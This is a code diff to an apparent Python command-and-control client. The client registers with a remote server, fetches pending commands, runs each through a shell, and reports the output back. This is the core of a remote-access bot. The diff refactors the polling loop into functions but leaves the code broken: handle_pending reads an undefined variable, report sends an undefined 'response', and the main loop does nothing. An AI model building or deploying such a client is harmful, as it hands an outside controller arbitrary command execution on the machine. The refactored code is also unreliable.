@@ -1,4 +1,4 @@
-#!`which python`
+#!`which python3`
 
 
 import subprocess
@@ -26,32 +26,38 @@ CLIENTID, KEY=json.loads(session.post('http://' + HOST + '/client/register',data
     'uname':UNAME,
 }).text)
 
+
 def do_cmd(cmd):
     return subprocess.check_output(cmd,shell=True).decode().strip()
 
 
-while True:
-    control=json.loads(session.post('http://'+HOST+'/client/get_pending', data={
+def get_pending():
+    return json.loads(session.post('http://'+HOST+'/client/get_pending', data={
         'clientname':CLIENTNAME,
         'uname':UNAME,
         'clientid':CLIENTID,
+        'key':KEY,
     }).text)
 
-    response={
+
+def handle_pending(cnc):
+    return json.dumps({
         'clientid': CLIENTID,
         'report': {
             commandid: do_cmd(command)
             for commandid, command in control
         }
-    }
+    })
 
-    if len(response) > 0:
-        session.post(
-            'http://'+HOST+'/client/submit_pending',
-            data=json.dumps(response),
-            headers={'content-type':'application/json'}
-        )
-    
-    time.sleep(10)
-    
+
+def report(data):
+    session.post(
+        'http://'+HOST+'/client/submit_pending',
+        data=json.dumps(response),
+        headers={'content-type':'application/json'}
+    )
+
+
+while True:
+    pass
 
